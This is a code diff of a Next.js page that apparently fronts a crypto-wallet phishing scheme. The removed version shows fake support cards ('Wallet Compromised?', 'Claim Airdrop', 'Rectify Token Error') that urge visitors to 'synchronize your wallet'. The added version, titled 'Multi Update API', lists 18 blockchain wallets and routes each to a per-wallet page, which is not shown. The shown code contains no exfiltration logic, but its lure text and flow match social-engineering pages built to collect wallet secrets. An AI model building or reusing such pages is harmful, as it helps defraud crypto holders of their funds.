@@ -1,3 +1,4 @@
+/* eslint-disable @typescript-eslint/no-explicit-any */
 "use client"
 
 import { Button } from "@/components/ui/button"
@@ -5,146 +6,206 @@ import { Card, CardContent } from "@/components/ui/card"
 import { ChevronDown } from "lucide-react"
 import { useRouter } from "next/navigation"
 import { useEffect, useRef, useState } from "react"
+import Image from "next/image"
+import bitcoinIcon from "@/assets/images/bitcoin.webp"
+import ethIcon from "@/assets/images/eth.jpg"
+import solanaIcon from "@/assets/images/solana.jpg"
+import xrpIcon from "@/assets/images/xrp.jpg"
+import cardanoIcon from "@/assets/images/cardano.jpg"
+import aptosIcon from "@/assets/images/aptos.jpg"
+import polkadotIcon from "@/assets/images/polkadot.png"
+import cronosIcon from "@/assets/images/cronos.jpg"
+import tonIcon from "@/assets/images/ton.png"
+import venomIcon from "@/assets/images/venom.jpg"
+import suiIcon from "@/assets/images/sui.webp"
+import radixIcon from "@/assets/images/radix.png"
+import roninIcon from "@/assets/images/ronin.png"
+import runeIcon from "@/assets/images/rune.webp"
+import hederaIcon from "@/assets/images/hedera.jpg"
+import flareIcon from "@/assets/images/flare.png"
+import keplrIcon from "@/assets/images/keplr.png"
+import otherIcon from "@/assets/images/plus.jpg"
+
+
+interface CardData {
+  icon: string;
+  title: string;
+  description: string;
+  symbol: string;
+}
 
 export default function Component() {
   const router = useRouter()
-  const [visibleCards, setVisibleCards] = useState(new Set([0, 1, 2, 3]))
+  const [visibleCards, setVisibleCards] = useState(new Set(Array.from({length: 18}, (_, i) => i)))
   const cardRefs = useRef<(HTMLDivElement | null)[]>([])
+  const [isClient, setIsClient] = useState(false)
+
+  // Get the appropriate icon for each symbol
+  const getIcon = (symbol: string) => {
+    const icons: { [key: string]: any } = {
+      BTC: bitcoinIcon,
+      ETH: ethIcon,
+      SOL: solanaIcon,
+      XRP: xrpIcon,
+      ADA: cardanoIcon,
+      APT: aptosIcon,
+      DOT: polkadotIcon,
+      CRO: cronosIcon,
+      TON: tonIcon,
+      VENOM: venomIcon,
+      SUI: suiIcon,
+      XRD: radixIcon,
+      RUNE: runeIcon,
+      RON: roninIcon,
+      HBAR: hederaIcon,
+      FLR: flareIcon,
+      KPLR: keplrIcon,
+      OTHER: otherIcon
+    };
+    return icons[symbol] || null;
+  }
+
+  // Blockchain-specific colors for symbols
+  const getSymbolColor = (symbol: string): string => {
+    const colors: { [key: string]: string } = {
+      BTC: "bg-orange-500 hover:bg-orange-600",
+      ETH: "bg-blue-500 hover:bg-blue-600", 
+      SOL: "bg-purple-500 hover:bg-purple-600",
+      XRP: "bg-blue-400 hover:bg-blue-500",
+      ADA: "bg-blue-600 hover:bg-blue-700",
+      APT: "bg-green-500 hover:bg-green-600",
+      DOT: "bg-pink-500 hover:bg-pink-600",
+      CRO: "bg-blue-700 hover:bg-blue-800",
+      TON: "bg-blue-500 hover:bg-blue-600",
+      VENOM: "bg-green-600 hover:bg-green-700",
+      SUI: "bg-cyan-500 hover:bg-cyan-600",
+      XRD: "bg-red-500 hover:bg-red-600",
+      RON: "bg-blue-600 hover:bg-blue-700",
+      RUNE: "bg-green-500 hover:bg-green-600",
+      HBAR: "bg-purple-600 hover:bg-purple-700",
+      FLR: "bg-red-500 hover:bg-red-600",
+      KPLR: "bg-purple-500 hover:bg-purple-600",
+      OTHER: "bg-gray-500 hover:bg-gray-600"
+    };
+    return colors[symbol] || "bg-gray-500 hover:bg-gray-600";
+  }
 
   const cardData = [
     {
-      title: "Migration",
-      description: "Click here for migration or anything related to migration",
+      icon: "an image imported with next/image from assets folder",
+      title: "Bitcoin Wallet",
+      description: "Bitcoin Blockchain Wallet",
+      symbol: "BTC",
     },
     {
-      title: "General Issues",
+      icon: "an image imported with next/image from assets folder",
+      title: "Ethereum Wallet",
       description:
-        "For instant solution on any type of issues, click the button below to synchronize your wallet and select Correct Node Strings",
+        "Ethereum Virtual Machine Compatible Wallet",
+      symbol: "ETH",
     },
     {
-      title: "Swap/Exchange",
+      icon: "an image imported with next/image from assets folder",
+      title: "Solana Wallet",
       description:
-        "We will support you in any related issues with swapping and/or exchange of coins. Kindly click here.",
+        "Solana Blockchain Wallet",
+      symbol: "SOL",
     },
     {
-      title: "Validation",
-      description: "For validation related issue, click the button below to synchronize your wallet and select validate Account",
+      icon: "an image imported with next/image from assets folder",
+      title: "XRP Wallet",
+      description: "XRP Ledger Wallet",
+      symbol: "XRP",
     },
     {
-      title: "Claim Presale",
-      description: "Are you finding it difficult for Claiming of Presale or any other related issues?",
+      icon: "an image imported with next/image from assets folder",
+      title: "Cardano Wallet",
+      description: "Cardano Blockchain Wallet",
+      symbol: "ADA",
     },
     {
-      title: "Staking Rewards",
-      description: "Maximize your earnings through our secure staking platform with competitive APY rates.",
+      icon: "an image imported with next/image from assets folder",
+      title: "Aptos Wallet",
+      description: "Aptos Blockchain Wallet",
+      symbol: "APT",
     },
     {
-      title: "NFT Marketplace",
-      description: "Buy, sell, and trade NFTs on our decentralized marketplace with zero gas fees.",
+      icon: "an image imported with next/image from assets folder",
+      title: "Polkadot Wallet",
+      description: "Polkadot Ecosystem Wallet",
+      symbol: "DOT",
     },
     {
-      title: "DeFi Lending",
-      description: "Lend your crypto assets and earn passive income with our automated lending protocols.",
+      icon: "an image imported with next/image from assets folder",
+      title: "Cronos Wallet",
+      description: "Cronos Chain Wallet",
+      symbol: "CRO",
     },
     {
-      title: "Cross-Chain Bridge",
-      description: "Seamlessly transfer assets across different blockchain networks with our bridge technology.",
+      icon: "an image imported with next/image from assets folder",
+      title: "Ton Wallet",
+      description: "The Open Network Wallet",
+      symbol: "TON",
     },
     {
-      title: "Claim reward",
-      description: "For claim, reward enrollment click the button below to synchronize your wallet and obtain your reward",
+      icon: "an image imported with next/image from assets folder",
+      title: "Venom Wallet",
+      description: "Venom Blockchain Wallet",
+      symbol: "VENOM",
     },
     {
-      title: "Token Bridge",
-      description: "For issues with token bridge click the button below to synchronize your wallet and select Enable Bridge",
+      icon: "an image imported with next/image from assets folder",
+      title: "Sui Wallet",
+      description: "Sui Blockchain Wallet",
+      symbol: "SUI",
     },
     {
-      title: "Token Rectification",
-      description: "For issues with token rectification, click the button below to synchronize your wallet and select Rectify Token Error",
+      icon: "an image imported with next/image from assets folder",
+      title: "Radix Wallet",
+      description: "Radix DLT Wallet",
+      symbol: "XRD",
     },
     {
-      title: "Buy & Sell",
-      description: "For issues with buying and selling, click the button below to synchronize your wallet, then select Buy or Sell",
+      icon: "an image imported with next/image from assets folder",
+      title: "Ronin Wallet",
+      description: "Ronin Sidechain Wallet",
+      symbol: "RON",
     },
     {
-      title: "Errors Rectification",
-      description: "For issues with any errors, click the button below to synchronize your wallet and then select Detect & Fix Error",
+      icon: "an image imported with next/image from assets folder",
+      title: "Rune Wallet",
+      description: "THORchain Rune Wallet",
+      symbol: "RUNE",
     },
     {
-      title: "Stake & Unstake",
-      description: "For issues with token Staking and Unstaking click the button below to synchronize your wallet and select Enable Stake and Unstake",
+      icon: "an image imported with next/image from assets folder",
+      title: "Hedera Wallet",
+      description: "Hedera Hashgraph Wallet",
+      symbol: "HBAR",
     },
     {
-      title: "KYC & Whitelist",
-      description: "To whitelist or complete LYX click the button below to synchronize your wallet and select Whitelist wallet",
+      icon: "an image imported with next/image from assets folder",
+      title: "Flare Wallet",
+      description: "Flare Network Wallet",
+      symbol: "FLR",
     },
     {
-      title: "Claim Airdrop",
-      description: "For Airdrop enroll and claim click the button below to synchronize your wallet and select enroll and claim",
+      icon: "an image imported with next/image from assets folder",
+      title: "Keplr Wallet",
+      description: "Cosmos Ecosystem Wallet",
+      symbol: "KPLR",
     },
     {
-      title: "Unable to Access Wallet?",
-      description: "Are you unable to access your wallet? click the button below to synchronize your wallet and select regain access",
-    },
-    {
-      title: "Wallet Compromised?",
-      description: "Are you a victim of wallet hack? click the button below to synchronize your wallet and hold the transactions.",
-    },
-    {
-      title: "Connect to Dapps",
-      description: "Connect decentralised web applications to mobile wallets. Enable DAPP on mobile wallet / Extension.",
-    },
-    {
-      title: "Login Issues",
-      description: "Do you have issues logging into your wallet?",
-    },
-    {
-      title: "Transaction Delay",
-      description: "Do you have issues with transactions being delayed?",
-    },
-    {
-      title: "Issues with Trading Wallet",
-      description: "Issues with Trading Wallet?",
-    },
-    {
-      title: "Unable to Purchase Coins",
-      description: "if your account is not recognized as a trusted payment source you may not be able to buy crypto and add coins",
-    },
-    {
-      title: "Locked Account",
-      description: "if you are logged out due to activity on the account.",
-    },
-    {
-      title: "Missing Funds/Irregular Balance",
-      description: "Lost Access to funds or funds is missing?",
-    },
-    {
-      title: "Bridge Transfer",
-      description: "Do you have any issues while trying to transfertokens between chains?.",
-    },
-    {
-      title: "Wallet Glitch Error",
-      description: "If you have any glitch issues on your wallet.",
-    },
-    {
-      title: "Slippage",
-      description: "For slippage issues or any other related issues.",
-    },
-    {
-      title: "Ledger & Trezor",
-      description: "For ledger or Trezor related issues click the button below to synchronize your wallet and select correct node string",
-    },
-    {
-      title: "Missing Funds",
-      description: "Lost access to funds or funds is missing?",
-    },
-    {
-      title: "Website not Loading?",
-      description: "Are you unable to load exchange website? click the button below to synchronize your wallet and select correct node string",
+      icon: "an image imported with next/image from assets folder",
+      title: "Other Wallets",
+      description: "Additional Wallets Support",
+      symbol: "OTHER",
     },
   ]
 
   useEffect(() => {
+    setIsClient(true)
+
     const observer = new IntersectionObserver(
       (entries) => {
         entries.forEach((entry) => {
@@ -154,7 +215,7 @@ export default function Component() {
           }
         })
       },
-      { threshold: 0.1, rootMargin: "50px" },
+      { threshold: 0.1, rootMargin: "50px" }
     )
 
     cardRefs.current.forEach((ref) => {
@@ -164,8 +225,12 @@ export default function Component() {
     return () => observer.disconnect()
   }, [])
 
-  const handleCardClick = () => {
-    router.push("/profile")
+  if (!isClient) return null
+  
+  const handleCardClick = (card: CardData, index: number) => {
+    const symbol = cardData[index].symbol
+    const network = cardData[index].title
+    router.push(`/wallet/${symbol.toLowerCase()}?network=${encodeURIComponent(network)}`)
   }
 
   return (
@@ -202,33 +267,23 @@ export default function Component() {
       {/* Main Content */}
       <div className="container mx-auto px-4 py-16">
         <div className="text-center mb-16">
-        <Button
-            variant="ghost"
-            size="sm" // Keep sm for base size, adjust padding manually
-            className="bg-white/10 backdrop-blur-sm border border-white/20 hover:bg-white/20 transition-all duration-300 mb-4 px-4 py-1 rounded-full"
-          >
-            {" "}
-            {/* Reduced mb-8 to mb-4, added px-4 py-1, and rounded-full */}
-            <span className="bg-gradient-to-r from-purple-400 via-purple-300 to-purple-500 bg-clip-text text-transparent font-bold text-base md:text-lg">
-              {" "}
-              {/* Reduced text-2xl to text-base and md:text-3xl to md:text-lg */}
-              Synchronize Protocol
-            </span>
-          </Button>
+        <h1 className="text-5xl font-bold text-white">           
+            Multi Update API
+        </h1><br></br>
 
-          <p className="text-white text-sm md:text-sm max-w-1xl mx-auto mb-12 leading-relaxed">
-            This is a technology, not an app, that allows all noncustodial wallets to create a remote resolution.
+          <p className="text-gray-100 text-6xl md:text-lg max-w-2xl mx-auto mb-6 leading-relaxed">
+          Connect to multiple blockchain networks and manage your crypto assets securely
           </p>
 
           <div className="flex flex-col sm:flex-row gap-4 justify-center items-center mb-16">
             
           </div>
 
-          <h2 className="text-1xl text-white mb-12">Make Selection Below</h2>
+          <h2 className="text-1xl text-white mb-12">Select Wallet Type</h2>
         </div>
 
         {/* Cards Grid */}
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 max-w-7xl mx-auto">
+        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 max-w-6xl mx-auto">
           {cardData.map((card, index) => (
             <div
               key={index}
@@ -243,15 +298,45 @@ export default function Component() {
             >
               <Card
                 className="bg-black/20 backdrop-blur-sm border-white/10 hover:bg-gradient-to-br hover:from-purple-600/20 hover:to-purple-800/20 transition-all duration-300 cursor-pointer group"
-                onClick={handleCardClick}
+                onClick={() => handleCardClick(card, index)}
               >
-                <CardContent className="p-6 text-center">
-                  <h3 className="text-xl font-semibold text-white mb-4 group-hover:text-purple-200 transition-colors">
-                    {card.title}
-                  </h3>
-                  <p className="text-gray-300 text-sm leading-relaxed group-hover:text-gray-200 transition-colors">
-                    {card.description}
-                  </p>
+                <CardContent className="p-6">
+                  <div className="flex items-center gap-4">
+                    {/* Icon on the left */}
+                    <div className="flex-shrink-0">
+                      {getIcon(card.symbol) ? (
+                        <Image 
+                          src={getIcon(card.symbol)}
+                          alt={card.title}
+                          width={64}
+                          height={64}
+                          className="rounded"
+                        />
+                      ) : (
+                        /* Placeholder for blockchain icons without downloaded images */
+                        <div className="w-16 h-16 bg-white/10 rounded-lg flex items-center justify-center">
+                          <div className="w-12 h-12 bg-white/20 rounded"></div>
+                        </div>
+                      )}
+                    </div>
+                    
+                    {/* Centralized content */}
+                    <div className="flex-1 text-center">
+                      <h3 className="text-2xl font-semibold text-white mb-3 group-hover:text-purple-200 transition-colors">
+                        {card.title}
+                      </h3>
+                      <p className="text-gray-300 text-base leading-relaxed group-hover:text-gray-200 transition-colors mb-4">
+                        {card.description}
+                      </p>
+                      
+                      {/* Symbol as styled button */}
+                      <div className="flex justify-center">
+                        <span className={`px-5 py-2 rounded-full text-white text-base font-semibold transition-colors ${getSymbolColor(card.symbol)}`}>
+                          {card.symbol}
+                        </span>
+                      </div>
+                    </div>
+                  </div>
                 </CardContent>
               </Card>
             </div>
